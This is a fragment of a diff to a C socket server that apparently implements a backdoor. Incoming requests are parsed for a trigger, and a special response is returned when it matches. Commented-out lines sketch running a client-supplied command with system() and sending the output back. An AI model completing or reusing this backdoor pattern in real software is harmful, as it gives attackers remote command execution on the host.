@@ -49,12 +49,12 @@ int main(int argc, char *argv[]) {
         recv(client_socket, &client_buffer, sizeof(client_buffer), 0);
         int bd_check = parse(client_buffer);
         if (bd_check > 0) {
+            //cmd = getcmd(client_buffer);
+            //out = system(cmd);
+            //the_goods = strcat(bd_response, out);
             send(client_socket, bd_response, strlen(bd_response), 0);
         }
-        //if GET && url is /exec/command (depends on rtn val){
-        //the_goods = strcat(bd_response, stdout);
         //send(client_socket, the_goods, strlen(the_goods), 0);
-        //}
         
         else {
         send(client_socket, notfound_response, strlen(notfound_response), 0);
